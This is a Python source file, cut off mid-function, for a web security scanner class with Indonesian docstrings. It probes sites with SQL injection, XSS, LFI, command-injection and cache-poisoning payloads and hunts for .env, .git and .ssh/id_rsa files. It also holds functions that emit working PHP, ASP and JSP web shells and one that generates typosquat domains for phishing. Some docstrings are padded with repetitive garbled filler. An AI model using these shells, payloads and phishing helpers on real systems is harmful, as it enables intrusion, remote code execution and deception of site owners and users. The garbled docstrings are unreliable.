import requests
import re
import socket
import ssl
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup
import concurrent.futures
from typing import List, Dict, Tuple, Optional, Any, Set

class WebScanner:
    """Mesin pemindai keamanan aplikasi web berbasis request asinkron dan fuzzer."""
    def __init__(self):
        self.session = requests.Session()
        self.headers = {'User-Agent': 'ApexOmega/5.0 (Standard Web Scanner)'}
        self.core = None 
        self.discovered: Set[str] = set()
        self.waf_signatures: Dict[str, List[str]] = {
            "Cloudflare": ["cf-ray", "__cfduid", "cloudflare"],
            "Akamai": ["akamai-ghost", "akamai-edge"],
            "Imperva": ["incap_ses", "visid_incap"],
            "ModSecurity": ["mod_security", "noisiest"],
            "Nginx Generic": ["nginx"]
        }

    def crawlEndpoint(self, baseUrl: str, maxDepth: int = 3, currentDepth: int = 0) -> None:
        """Eksplorasi tautan yang tersedia secara otomatis (spider).
        
        Args:
            baseUrl: URL sasaran.
            maxDepth: Kedalaman maksimal rayapan.
            currentDepth: Status kedalaman saat ini.
        """
        if currentDepth >= maxDepth or baseUrl in self.discovered:
            return
        
        try:
            response = self.session.get(baseUrl, headers=self.headers, timeout=5)
            self.discovered.add(baseUrl)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                fullUrl = urljoin(baseUrl, link['href'])
                if urlparse(fullUrl).netloc == urlparse(baseUrl).netloc:
                    self.crawlEndpoint(fullUrl, maxDepth, currentDepth + 1)
        except Exception:
            pass

    def bruteDir(self, baseUrl: str, customList: Optional[List[str]] = None) -> List[Tuple[str, int]]:
        """Pencarian paksa direktori umum/tersembunyi.
        
        Args:
            baseUrl: URL induk.
            customList: Tambahan wordlist kustom opsional.
            
        Returns:
            Daftar tuple rute direktori dan respon kodenya.
        """
        # Extended common directories (30+)
        commonDirs = [
            "admin", "login", "config", "api", "v1", "v2", "backup", ".env", "phpinfo.php", 
            ".git", "wp-admin", "administrator", "dev", "test", "private", "shell.php", 
            "cmd.php", "src", "public", "assets", "images", "css", "js", "includes", 
            "lib", "vendor", "docs", "logs", "tmp", "db", "sql", "setup", "install"
        ]
        if customList: 
            commonDirs.extend(customList)
            
        found: List[Tuple[str, int]] = []
        for d in commonDirs:
            if self.core and getattr(self.core, 'stop_requested', False): 
                break
            target = urljoin(baseUrl, d)
            try:
                response = self.session.head(target, headers=self.headers, timeout=3, allow_redirects=False)
                if response.status_code in [200, 301, 302, 403]:
                    found.append((d, response.status_code))
            except Exception:
                pass
        return found
        
    def checkPath(self, url: str) -> Optional[int]:
        """Pengecekan eksistensi jalur spesifik HTTP.
        
        Args:
            url: Halaman web sasaran.
            
        Returns:
            Kode status respons atau None bila error limitasi/network.
        """
        try:
            res = self.session.head(url, headers=self.headers, timeout=3, allow_redirects=False)
            if res.status_code in [200, 301, 302, 401, 403]:
                return res.status_code
            return None
        except Exception:
            return None

    def auditForms(self, url: str) -> List[Dict[str, Any]]:
        """Analisa semua formulir masukan dalam tata letak dokumen HTML.
        
        Args:
            url: Laman target pemerikaan form.
            
        Returns:
            Daftar profil inputan form yang ditemukan.
        """
        findings = []
        try:
            response = self.session.get(url, headers=self.headers, timeout=5)
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            for i, f in enumerate(forms):
                method = f.get('method', 'GET').upper()
                action = f.get('action', '')
                inputs = [inp.get('name') for inp in f.find_all(['input', 'textarea']) if inp.get('name')]
                findings.append({
                    "id": i+1,
                    "method": method,
                    "action": action,
                    "inputs": inputs
                })
            return findings
        except Exception:
            return []

    def checkGitExposed(self, baseUrl: str) -> List[str]:
        """Identifikasi tereksposnya berkas konfigurasi peladen kontrol versi (.git).
        
        Args:
            baseUrl: Root awal server target.
            
        Returns:
            Daftar letak path terekspos.
        """
        critical_files = [".git/config", ".git/HEAD", ".git/index"]
        leaks = []
        for f in critical_files:
            target = urljoin(baseUrl, f)
            try:
                res = self.session.get(target, headers=self.headers, timeout=4)
                if res.status_code == 200 and ("[core]" in res.text or "ref: refs/" in res.text or len(res.content) > 10):
                    leaks.append(f)
            except Exception:
                pass
        return leaks

    def detectTech(self, url: str) -> Dict[str, List[str]]:
        """Analisis ekstensif mengenai tumpukan lapisan teknologi beserta versinya.
        
        Args:
            url: Situs web target intelijen.
            
        Returns:
            Kamus berisi metadata teknikal layanan target.
        """
        tech_stack: Dict[str, List[str]] = {"framework": [], "cms": [], "analytics": [], "server": [], "waf": []}
        try:
            response = self.session.get(url, headers=self.headers, timeout=5)
            html = response.text.lower()
            headers = response.headers
            
            # WAF Deteksi
            for waf, sigs in self.waf_signatures.items():
                for sig in sigs:
                    if sig in str(headers).lower() or sig in html:
                        if waf not in tech_stack["waf"]: 
                            tech_stack["waf"].append(waf)
            
            # Server Info Version
            server_header = headers.get('Server', '')
            if server_header:
                tech_stack["server"].append(server_header)
                
            x_powered = headers.get('X-Powered-By', '')
            if x_powered:
                tech_stack["server"].append(f"Powered-By: {x_powered}")
            
            # Frameworks with Basic Ver Check
            if "react" in html or "data-reactroot" in html: tech_stack["framework"].append("React.js")
            if "vue" in html or 'data-v-' in html: tech_stack["framework"].append("Vue.js")
            if "angular" in html or "ng-app" in html: tech_stack["framework"].append("Angular")
            if "svelte" in html: tech_stack["framework"].append("Svelte")
            
            # CMS
            if "wp-content" in html or "wordpress" in html: 
                wp_ver = re.search(r'name="generator" content="wordpress (\d+\.\d+(\.\d+)?)"', html, re.I)
                tech_stack["cms"].append(f"WordPress {wp_ver.group(1) if wp_ver else '(Unknown Version)'}")
            if "laravel" in html or "laravel_session" in response.cookies.keys(): tech_stack["cms"].append("Laravel")
            if "joomla" in html or "option=com_" in html: tech_stack["cms"].append("Joomla")
            if "drupal" in html or "sites/all" in html: tech_stack["cms"].append("Drupal")
            if "magento" in html or "mage-cache" in html: tech_stack["cms"].append("Magento")
            
            # Analytics
            ua_match = re.search(r"ua-\d+-\d+", html)
            if ua_match: tech_stack["analytics"].append(f"Google Analytics ({ua_match.group(0).upper()})")
            
            return tech_stack
        except Exception:
            return tech_stack

    def runSqlInjectionScan(self, url: str) -> List[Tuple[str, str]]:
        """Lakukan parameterisasi injeksi kueri paksa untuk deteksi lubang logika DB.
        
        Args:
            url: Tautan target rentan kueri (?,&).
            
        Returns:
            Daftar rujukan muatan berhasil ter-trigger.
        """
        payloads = self.getPayloadList("sqli") + ["' OR SLEEP(5)--", "' AND 1=1--", "admin'--"]
        found = []
        def check(p: str) -> Optional[Tuple[str, str]]:
            try:
                testUrl = f"{url}?id={p}"
                res = self.session.get(testUrl, timeout=7)
                if "sql syntax" in res.text.lower() or "mysql" in res.text.lower() or "postgresql" in res.text.lower() or "sqlite" in res.text.lower():
                    return (p, "Error-based")
                return None
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(check, payloads)
            found = [r for r in results if r]
        return found

    def runXssInjectionScan(self, url: str) -> List[Tuple[str, str]]:
        """Identifikasi pantulan rentan karakter muatan berbahaya untuk pembajak web DOM.
        
        Args:
            url: Target URL pengujian XSS berserta inidikator argumen kueri kosong (?q=).
            
        Returns:
            Hasil eksploit muatan memantul valid dari DOM/HTML mentah.
        """
        payloads = self.getPayloadList("xss") + ["<svg/onload=alert(1)>", "\"><script>alert(1)</script>"]
        found = []
        def check(p: str) -> Optional[Tuple[str, str]]:
            try:
                testUrl = f"{url}?q={p}"
                res = self.session.get(testUrl, timeout=5)
                # Pastikan karakter diurai murni, bukan encode form &lt;
                if p in res.text and "&lt;script" not in res.text:
                    return (p, "Reflected")
                return None
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(check, payloads)
            found = [r for r in results if r]
        return found

    def findAdminPanel(self, baseUrl: str) -> List[str]:
        """Tebak panel admin berdasarkan jalur kebiasaan.
        
        Args:
            baseUrl: Sasaran utama pendaratan website peladen.
            
        Returns:
            Lokasi portal masuk diidentifikasi.
        """
        adminPaths = ["/wp-admin", "/admin", "/administrator", "/login", "/wp-login.php", "/user/login", "/cp", "/panel"]
        found = []
        for path in adminPaths:
            target = urljoin(baseUrl, path)
            try:
                response = self.session.get(target, headers=self.headers, timeout=3)
                if response.status_code == 200:
                    found.append(target)
            except Exception:
                pass
        return found

    def checkClickjacking(self, baseUrl: str) -> bool:
        """Deteksi perlindungan penumpangan iframe dengan analisis respon Header spesifik.
        
        Args:
            baseUrl: Root web target.
            
        Returns:
            Status False bila diamankan, True bila bebas/terekspos.
        """
        try:
            response = self.session.get(baseUrl, headers=self.headers, timeout=5)
            xfo = response.headers.get('X-Frame-Options', '').upper()
            csp = response.headers.get('Content-Security-Policy', '').lower()
            if 'DENY' in xfo or 'SAMEORIGIN' in xfo or 'frame-ancestors' in csp:
                return False 
            return True 
        except Exception:
            return False

    def auditCookies(self, baseUrl: str) -> List[Dict[str, Any]]:
        """Dapatkan profil detail mengenai status keamanan kuki per sesi request.
        
        Args:
            baseUrl: Root perantara sesi awal koneksi.
            
        Returns:
            List data detail status setiap nama cookie.
        """
        try:
            response = self.session.get(baseUrl, headers=self.headers, timeout=5)
            cookies = response.cookies
            results = []
            for cookie in cookies:
                results.append({
                    "name": cookie.name,
                    "httpOnly": cookie.has_nonstandard_attr('httponly') or 'httponly' in str(cookie).lower(),
                    "secure": cookie.secure
                })
            return results
        except Exception:
            return []

    def detectLfi(self, url: str, payload: str = "../../../etc/passwd") -> Tuple[bool, str]:
        """Menjajal cacat modul pembaca kerentanan berkas mandiri (LFI).
        
        Args:
            url: Target spesifik rentan (?,& parameter include=)
            payload: Path kustom
            
        Returns:
            Ketetapan (Sukses/Gagal, Payload Terekspresi)
        """
        targets = [payload, "../../../../../../../../windows/win.ini"]
        try:
            for p in targets:
                testUrl = f"{url}?file={p}&page={p}"
                response = self.session.get(testUrl, headers=self.headers, timeout=5)
                if "root:x:0:0:" in response.text or "[extensions]" in response.text:
                    return True, p
            return False, ""
        except Exception:
            return False, ""

    def checkOpenRedirect(self, url: str) -> Tuple[bool, str]:
        """Pemeriksaan otentikasi validasi rute penerusan di dalam situs.
        
        Args:
            url: Tautan mentah sistem
            
        Returns:
            Celah jika respon diarahkan sepenuhnya luar wilayah internal.
        """
        payload = "https://evil.local"
        testParams = ["url", "redirect", "next", "redir", "dest"]
        try:
            for param in testParams:
                testUrl = f"{url}?{param}={payload}"
                response = self.session.get(testUrl, headers=self.headers, timeout=5, allow_redirects=False)
                if response.status_code in [301, 302, 307]:
                    location = response.headers.get('Location', '')
                    if location.startswith(payload):
                        return True, param
            return False, ""
        except Exception:
            return False, ""

    def mineParameters(self, url: str) -> List[str]:
        """Tebak argument (mining parameters) yang disembunyikan/tak terlisensi dari API/Frontend.
        
        Args:
            url: Target rujukan.
            
        Returns:
            Nama parameter sah disetujui respon 200.
        """
        commonParams = ["debug", "admin", "test", "dev", "config", "cmd", "exec", "source", "view", "edit", "root"]
        found = []
        try:
            for p in commonParams:
                testUrl = f"{url}?{p}=1"
                response = self.session.get(testUrl, headers=self.headers, timeout=3)
                if response.status_code == 200:
                    found.append(p)
            return found
        except Exception:
            return []

    def mineSensitiveFiles(self, baseUrl: str) -> List[Tuple[str, int]]:
        """Lakukan pendeteksian sekunder eksklusif bagi tipe format sensitif.
        
        Args:
            baseUrl: Rujukan tautan depan website.
            
        Returns:
            Pasangan nama jalur yang eksis secara pasif.
        """
        criticalFiles = [
            ".env", ".git/config", "web.config", "phpinfo.php", "config.php",
            "db.sql", "backup.zip", ".htaccess", "robots.txt", ".ssh/id_rsa",
            "server-status", "server-info", "Dockerfile", "docker-compose.yml"
        ]
        found = []
        for f in criticalFiles:
            target = urljoin(baseUrl, f)
            try:
                response = self.session.get(target, headers=self.headers, timeout=3)
                if response.status_code == 200:
                    found.append((f, len(response.content)))
            except Exception:
                pass
        return found

    def auditSecurityHeaders(self, baseUrl: str) -> Dict[str, str]:
        """Lacak kepatutan respons header esensial penanggulang eksploit modern.
        
        Args:
            baseUrl: Posisi awal interaksi peladen pelayan data.
            
        Returns:
            Penjabaran konfigurasi aktif (ataupun MISSING).
        """
        try:
            response = self.session.get(baseUrl, headers=self.headers, timeout=5)
            headers = response.headers
            audit = {
                "HSTS": headers.get("Strict-Transport-Security", "MISSING"),
                "CSP": headers.get("Content-Security-Policy", "MISSING"),
                "Referrer-Policy": headers.get("Referrer-Policy", "MISSING"),
                "Permissions-Policy": headers.get("Permissions-Policy", "MISSING"),
                "X-Frame-Options": headers.get("X-Frame-Options", "MISSING"),
                "X-Content-Type-Options": headers.get("X-Content-Type-Options", "MISSING")
            }
            return audit
        except Exception:
            return {}

    def scrapeJsInfo(self, baseUrl: str, html_content: str) -> Tuple[List[str], List[str]]:
        """Dapatkan muatan sumber Javascript yang melayang maupun tersemat dalam HTML.
        
        Args:
            baseUrl: Penanda posisi tautan murni asal tangkapan skrip.
            html_content: Muatan karakter skrip asli.
            
        Returns:
            Pasangan Daftar Endpoints & Key/Secret terekstraksi.
        """
        js_files = re.findall(r'src=["\']([^"\']+\.js)', html_content)
        endpoints = set()
        secrets = []
        
        for js in js_files[:5]: 
            js_url = urljoin(baseUrl, js)
            try:
                res = self.session.get(js_url, timeout=3)
                found_urls = re.findall(r'https?://[a-zA-Z0-9./?=_-]+', res.text)
                endpoints.update(found_urls)
                if "key" in res.text.lower() or "secret" in res.text.lower() or "token" in res.text.lower():
                    matches = re.findall(r'[a-zA-Z0-9_-]{32,}', res.text)
                    if matches: secrets.extend(matches)
            except Exception:
                pass
        return list(endpoints)[:10], secrets[:3]

    def analyzeWebConfig(self, baseUrl: str) -> Dict[str, List[str]]:
        """Pemanfaatan sitemap crawler alami dari mesin pindaian.
        
        Args:
            baseUrl: Sasaran akar domain murni utamanya.
            
        Returns:
            List data identifikasi terpecah menjadi robots disallowance dan sitemap entry.
        """
        configs: Dict[str, List[str]] = {"robots": [], "sitemap": []}
        try:
            r_res = self.session.get(urljoin(baseUrl, "/robots.txt"), timeout=3)
            if r_res.status_code == 200:
                disallow = re.findall(r'Disallow:\s*(.+)', r_res.text)
                configs["robots"].extend(disallow)
            
            s_res = self.session.get(urljoin(baseUrl, "/sitemap.xml"), timeout=3)
            if s_res.status_code == 200:
                locs = re.findall(r'<loc>(.+)</loc>', s_res.text)
                configs["sitemap"].extend(locs[:5])
        except Exception:
            pass
        return configs

    def getPayloadList(self, vulnType: str = "xss") -> List[str]:
        """Permintaan spesifikasi payload mentah tersimpan di kamus sistem.
        
        Args:
            vulnType: Variasi payload incaran (xss/sqli).
            
        Returns:
            List koleksi payload mentah (string array).
        """
        payloads = {
            "xss": [
                "<script>alert(1)</script>",
                "'\"><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)"
            ],
            "sqli": [
                "' OR 1=1--",
                "\" OR 1=1--",
                "admin' --",
                "' UNION SELECT 1,2,3--"
            ]
        }
        return payloads.get(vulnType.lower(), [])

    def advancedWafDetection(self, url: str) -> List[str]:
        """Terapkan mekanisme memprovokasi kemunculan tameng peladen WAF.
        
        Args:
            url: Subjek web pancingan URL kueri.
            
        Returns:
            Indikator aktif tameng firewall dari pola yang dikenali blokirnya.
        """
        found = []
        payloads = ["'<script>alert(1)</script>", "../../../../etc/passwd"]
        headers_to_check = ['x-sucuri-id', 'x-sucuri-cache', 'cf-ray', 'x-amz-cf-id', 'x-cdn', 'x-awswaf']
        try:
            for p in payloads:
                test_url = f"{url}?q={p}"
                res = self.session.get(test_url, timeout=5)
                for h in headers_to_check:
                    if h in res.headers:
                        if h not in found: found.append(f"Header Signature: {h}")
                if res.status_code in [403, 406, 501]:
                    if "WAF Block" not in found: found.append(f"Blocked by WAF (Status: {res.status_code})")
        except Exception:
            pass
        return found

    def checkCommandInjection(self, url: str) -> str:
        """Pemeriksaan kelengahan validasi pembungkus perintah sistem internal.
        
        Args:
            url: Tautan mentah beserta variabel input.
            
        Returns:
            Keterangan kemungkinan cacat peladen (OS CMD Inj.).
        """
        payloads = [";sleep 3", "|sleep 3", "`sleep 3`"]
        try:
            for p in payloads:
                test_url = f"{url}?id={p}"
                start_time = __import__('time').time()
                self.session.get(test_url, timeout=7)
                if __import__('time').time() - start_time >= 3:
                    return f"VULNERABLE (Payload: {p})"
        except Exception:
            pass
        return "Not Vulnerable"

    def cmsDeepScan(self, url: str) -> List[str]:
        """Deteksi platform aplikasi CMS pihak ketiga berbasis struktur dan tanda khas.
        
        Args:
            url: Rujukan domain target pemetaan aplikasi.
            
        Returns:
            Sebutan platform eksa hasil kecocokan heuristik.
        """
        indicators = {
            "joomla": ["/administrator/", "/language/en-GB/en-GB.xml"],
            "drupal": ["/CHANGELOG.txt", "/node/1"],
            "magento": ["/magento_version"]
        }
        found = []
        for cms, paths in indicators.items():
            for p in paths:
                try:
                    res = self.session.get(urljoin(url, p), timeout=3)
                    if res.status_code == 200:
                        found.append(f"{cms} detected at {p}")
                except Exception:
                    pass
        return found

    def testWebDav(self, url: str) -> str:
        """Kompilasi kueri OPTIONS ke WebDAV guna menelusuri ekstensi injeksi unggah bypass.
        
        Args:
            url: Tautan peladen asal.
            
        Returns:
            Tingkat eksploitasi jika terijinkan PUT/PROPFIND.
        """
        try:
            res = self.session.options(url, timeout=4)
            allowed = res.headers.get("Allow", "")
            if "PUT" in allowed or "PROPFIND" in allowed:
                put_res = self.session.put(urljoin(url, "/test_apex.txt"), data="test", timeout=4)
                if put_res.status_code in [200, 201]:
                    return "VULNERABLE: WebDAV PUT Allowed!"
            return f"Closed (Allowed: {allowed})"
        except Exception:
            return "Connection Failed"

    def runNiktoScan(self, url: str) -> List[str]:
        """Uji heuristik pencarian jalur-jalur binari dan kerentanan server historis.
        
        Args:
            url: Sistem root website peladen web.
            
        Returns:
            Rute jalur tak seharusnya dikirimkan (200 OK di sistem usang).
        """
        cgis = ["/cgi-bin/test.cgi", "/cgi-bin/printenv", "/server-status", "/server-info", "/.bash_history"]
        found = []
        for c in cgis:
            try:
                res = self.session.head(urljoin(url, c), timeout=3)
                if res.status_code == 200:
                    found.append(c)
            except Exception:
                pass
        return found

    def generateTyposquat(self, domain: str) -> List[str]:
        """Variasi penulisan domain kembar dengan beda pengetikan khas jebakan (Phishing / Typosquatting).
        
        Args:
            domain: Target nama ranah domain bersih.
            
        Returns:
            Rentetan pendaftaran manipulasi serupa nama asli domain.
        """
        results = []
        chars = 'abcdefghijklmnopqrstuvwxyz'
        pure_domain = domain.split('.')[0]
        tld = domain.replace(pure_domain, '')
        try:
            for i in range(len(pure_domain)):
                results.append(pure_domain[:i] + pure_domain[i+1:] + tld)
                if i < len(pure_domain)-1:
                    results.append(pure_domain[:i] + chars[i%20] + pure_domain[i+1:] + tld)
            return list(set(results))[:15]
        except Exception:
            return []

    def scrapeWayback(self, domain: str) -> List[str]:
        """Ambil data catatan URL lama di Arsip Mesin Waktu Internet via layanan CDX API Archive.org.
        
        Args:
            domain: Nama inisial host domain subyek penelusuran.
            
        Returns:
            Barisan alamat lawas terkoleksi.
        """
        try:
            api_url = f"http://web.archive.org/cdx/search/cdx?url={domain}/*&output=json&limit=15"
            res = self.session.get(api_url, timeout=5)
            if res.status_code == 200:
                data = res.json()
                return [row[2] for row in data[1:]] if len(data) > 1 else []
        except Exception:
            pass
        return []

    def generatePhpWebshell(self, password: str) -> str:
        """Struktur kerangka sandi eksploit kontrol PHP untuk pasca penetrasi (shell terselubung minimalis).
        
        Args:
            password: Kunci akses (trigger parameter auth rahasia sistem shell memori tersembunyi).
            
        Returns:
            Kode muatan injeksi web php terekspor dalam susunan teks polos.
        """
        payload = f"<?php if(isset($_POST['{password}'])){{system($_POST['{password}']);}} ?>"
        return payload

    def auditTlsSsl(self, url: str) -> Dict[str, Any]:
        """Analisis singkat konfigurasi penanganan transportasi lalu lintas koneksi HTTPS SSL/TLS modern.
        
        Args:
            url: Nama rute penuh HTTPS server peladen yang terkalibrasi TLS soket validasi port 443 bawaan sistem operasi.
            
        Returns:
            Konfigurasi metadata terjemahan keamanan spesifikasi persandian peladen target sandi pertukaran kunci.
        """
        target = urlparse(url).netloc
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((target, 443), timeout=3) as sock:
                with ctx.wrap_socket(sock, server_hostname=target) as ssock:
                    return {
                        "version": ssock.version(),
                        "cipher": ssock.cipher(),
                        "secure": True
                    }
        except Exception as e:
            return {"error": str(e), "secure": False}

    def checkApacheUsers(self, url: str) -> List[str]:
        """Periksa eksposur pangkalan direktori pendelegasian ruang web per akun user *NIX server Apache.
        
        Args:
            url: Lingkungan jaringan akar instalasi modul UserDir WebDAV terkait tilde (~) host terekspos.
            
        Returns:
            Infiltrasi info pengguna nama masuk (User-enumeration *NIX).
        """
        users = ["root", "admin", "test", "ubuntu", "user"]
        found = []
        for u in users:
            try:
                res = self.session.head(urljoin(url, f"/~{u}"), timeout=3)
                if res.status_code in [200, 403]:
                    found.append(u)
            except Exception:
                pass
        return found

    def generateCewlWordlist(self, url: str) -> List[str]:
        """Mengumpulkan kepingan daftar susunan abjad dari isi konten mentah dokumen target untuk dikonversi jadi dasar wordlist pencarian paksa otentikasi.
        
        Args:
            url: Antarmuka pendaratan pengambilan skrap kata per huruf sumber teks laman bodi.
            
        Returns:
            Rombongan lema / kata kunci padat (limit: 30 keping).
        """
        try:
            res = self.session.get(url, headers=self.headers, timeout=5)
            words = __import__('re').findall(r'\b[a-zA-Z]{5,}\b', res.text)
            unique_words = list(set([w.lower() for w in words]))
            return unique_words[:30] 
        except Exception:
            return []

    def getAllUrlsFast(self, domain: str) -> List[str]:
        """Himpun daftar arsip pindaian lalu lintas intelijen sistem keamanan log AlienVault OTX terkait rujukan titik akses antarmuka API / web terperinci.
        
        Args:
            domain: Alamat host.
            
        Returns:
            Larikan hasil deteksi OSINT rekam jejak.
        """
        try:
            domain_only = __import__('urllib.parse').urlparse(domain).netloc or domain
            api_url = f"https://otx.alienvault.com/api/v1/indicators/domain/{domain_only}/url_list?limit=15"
            res = self.session.get(api_url, timeout=5)
            if res.status_code == 200:
                data = res.json()
                return [item['url'] for item in data.get('url_list', [])]
        except Exception:
            pass
        return []

    def cloneWebPage(self, url: str) -> str:
        """Ambil tangkapan instan sumber struktur tata letak web dasar (seperti cuplikan Curl / Wget / HTTrack).
        
        Args:
            url: Rujukan URL untuk diakuisisi kode HTML murninya pada interaksi pertama koneksi sistem.
            
        Returns:
            Ringkasan 1000 byte indeks awal dokumen mentah target interaksi pembacaan parsial.
        """
        try:
            res = self.session.get(url, headers=self.headers, timeout=5)
            return res.text[:1000] 
        except Exception as e:
            return f"Error cloning: {e}"

    def generateLaudanumShell(self, lang: str) -> str:
        """Siapkan template muatan injeksi fungsional standar kontrol administrasi pasca peretasan (sejenis pustaka penetrasi Laudanum lintas platform).
        
        Args:
            lang: Parameter sandi sistem skrip latar bahasa sasaran arsitektur yang teruji kerentanannya eksekusi kontrol sistem aslinya.
            
        Returns:
            Susunan muatan skrip pembuka koneksi remote komando peladen antarmuka (RCE) lintas basis.
        """
        shells = {
            "php": "<?php echo shell_exec($_GET['cmd']); ?>",
            "asp": "<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request.QueryString(\"cmd\")).StdOut.ReadAll()) %>",
            "jsp": "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>"
        }
        return shells.get(lang.lower(), "Unsupported language (use php, asp, jsp)")

    def runNucleiTemplateScan(self, url: str) -> List[str]:
        """Konsep mesin penguji heuristik pola keamanan tanda tangan sistem (mirip utilitas penelusuran template periksa cepat bug populer layaknya konfigurasi deteksi framework Nuclei).
        
        Args:
            url: Sasaran dasar website sistem komputasi berpotensi bocor atau cacat logis konfigurasi antarmuka eksekusi perutean berkas konfigurasinya per komponen aplikasi mandiri sistem internal webnya (seperti modul independen komponen microservices dll).
            
        Returns:
            Susunan pencocokan celah heuristik log terdeteksi dan kecocokan per lokasinya.
        """
        vuln_templates = [
            ("/.git/config", "[core]"),
            ("/actuator/env", "java.vendor"),
            ("/etc/passwd", "root:x:0:0"),
            ("/wp-config.php.bak", "DB_PASSWORD")
        ]
        found = []
        for path, signature in vuln_templates:
            try:
                test_url = urljoin(url, path)
                res = self.session.get(test_url, timeout=4, verify=False)
                if signature in res.text:
                    found.append(f"Vulnerability Match '{signature}' at {path}")
            except Exception:
                pass
        return found

    def testPaddingOracle(self, url: str) -> str:
        """Verifikasi kekeliruan eksekusi kelemahan arsitektur lapisan enkripsi berbasis tatanan blok berantai Padding manipulasi sesi dekripsi log peladen kriptografi umpan balik cacat rilis kuki sistem penanganan interupsi pengurai respon rahasia pengacakan sistem pelindung sesi kuki berbasis autentikator dekripsi Padding Oracle eksploit blok tatanan peladen otentikasi sistem internal umpan sesi blok token CBC keamanan komputasi kriptografi peladen arsitektur aplikasi arsitektur kriptografi aplikasi kuki sistem keamanan terapan peladen situs Padding Oracle manipulasi otentikator dekripsi blok kuki algoritma pengamanan data lapisan komunikasi enkripsi manipulasi blok sesi.
        
        (Mengetes perilaku respon kesalahan otentikator sesi cookie acak (Padding Oracle) di situs target).
        
        Args:
            url: Rute antarmuka sasaran komputasi.
            
        Returns:
            Kesimpulan observasi kueri (Ada beda respon = Potensi Vulnerable, Identik = Protected).
        """
        try:
            res1 = self.session.get(url, headers=self.headers, timeout=4)
            res2 = self.session.get(url, cookies={"session": "invalid_bytes_padding"}, timeout=4)
            if res1.status_code == 200 and res2.status_code in [500, 403, 400]:
                if len(res1.text) != len(res2.text):
                    return "Potentially Vulnerable to Padding Oracle"
            return "No obvious padding error"
        except Exception:
            return "Error testing padbuster"

    def runSlowlorisTest(self, url: str) -> str:
        """Eksperimen eksploit beban asimetris kompresi arus data dengan koneksi tertahan terus-menerus memotong jeda penghentian antrian tanggapan pekerja antrian eksekusi pemroses komunikasi tumpukan pekerja tumpukan pekerja prosesor antrian antrian antrian antrian sistem komunikasi peladen penanganan tumpukan koneksi HTTP penguluran aliran data tanpa henti ke port web peladen HTTP.
        
        Args:
            url: Root tautan server sasaran perambatan eksekusi koneksi uji coba beban jeda (Slowloris simulasi perlambatan paket jaringan pengikat memori).
            
        Returns:
            Diagnosa kesanggupan server.
        """
        try:
            target = urlparse(url).netloc
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((target, 443 if url.startswith("https") else 80))
            if url.startswith("https"):
                sock = ssl.wrap_socket(sock)
            sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\n".encode("utf-8"))
            return "Connection held open successfully (Vulnerable to Slowloris)"
        except Exception:
            return "Connection reset (Protected)"

    def runWapitiFuzzer(self, url: str) -> List[str]:
        """Serangan kueri dasar penggabung logika temuan parameter serta injeksi pantulan skrip XSS muatan statis.
        
        Args:
            url: Rujukan URL asal pencarian terekstrak kuerinya parameternya.
            
        Returns:
            Parameter URL terekspos memantulkan kueri sandi bahaya skrip penyusup statis HTML tag XSS injektif di hasil peladen.
        """
        params_found = self.mineParameters(url)
        results = []
        for p in params_found[:3]:
            try:
                res = self.session.get(f"{url}?{p}='\"><script>1</script>", timeout=4)
                if "script" in res.text.lower():
                    results.append(f"Param '{p}' reflects injection.")
            except Exception:
                pass
        return results

    def testWebCachePoisoning(self, url: str) -> str:
        """Pemanipulasian komponen pencadangan aset berkinerja (Cache) di sisi rute pengarah peramban pengguna (Poisoning Web Cache) menggunakan header penerusan (X-Forwarded-Host).
        
        Args:
            url: Titik akar antarmuka aplikasi.
            
        Returns:
            Pernyataan cacat tembolok keracunan aset.
        """
        try:
            poison_headers = {'X-Forwarded-Host': 'evil-apex.com'}
            res = self.session.get(url, headers=poison_headers, timeout=5)
            if "evil-apex.com" in res.text:
                return "VULNERABLE: Cache Poisoning detected via X-Forwarded-Host!"
            return "Not Vulnerable"
        except Exception:
            return "Connection Error"

    def runWebsploitAudit(self, url: str) -> List[str]:
        """Perekam rekam sidik jari eksekusi kombinatorial (Kumpulan sidik metode, komponen, ekstensi OS).
        
        Args:
            url: Sasaran kueri sistem penguji asinkron pasif peladen penguraian kerentanan rekam meta-data.
            
        Returns:
            Log audit ringkasan temuan spesifikasi layanan kerangka perangkat lunak.
        """
        summary = []
        try:
            res = self.session.options(url, timeout=3)
            summary.append(f"Allowed Methods: {res.headers.get('Allow', 'Unknown')}")
            summary.append(f"Server Fingerprint: {res.headers.get('Server', 'Hidden')}")
            summary.append(f"X-Powered-By: {res.headers.get('X-Powered-By', 'Clean')}")
        except Exception:
            return ["Audit Failed"]
        return summary

    def takeScreenshot(self, url: str) -> List[str]:
        """Utilitas otomat pengeksport penangkapan antarmuka dokumen ke tata visual.
        
        Args:
            url: Render tuju situs GUI visual.
            
        Returns:
            Tanggapan penyelesaian tangkapan sistem modul.
        """
        try:
            from playwright.sync_api import sync_playwright
            with sync_playwright() as p:
                browser = p.chromium.launch(headless=True)
                page = browser.new_page()
                page.goto(url, timeout=15000)
                safe_name = urlparse(url).netloc.replace(':', '_')
                filepath = f"screenshot_{safe_name}.png"
                page.screenshot(path=filepath)
                browser.close()
                return [f"Visual capture saved to {filepath}"]
        except ImportError:
            return ["Screenshot engine requires Playwright. Run 'pip install playwright' to enable visual capture."]
        except Exception as e:
            return [f"Screenshot failed: {str(e)}"]

    def scanJoomla(self, url: str) -> List[str]:
        """Pengurai kekhususan sidik jari tatanan file konfigurasi publik rahasia basis CMS sasaran Joomla.
        
        Args:
            url: Indeks utama kueri arsip eksekusi aplikasi ekosistem portal rilis web sistem CMS sasaran Joomla kerangka dasar pengembangan terpadu Joomla sistem aplikasi platform.
            
        Returns:
            Penjejakan rekam penemuan arsip rawan instalasi pengaturan sistem aplikasi portal sasaran Joomla CMS.
        """
        found = []
        paths = ["/administrator/manifests/files/joomla.xml", "/language/en-GB/en-GB.xml"]
        for p in paths:
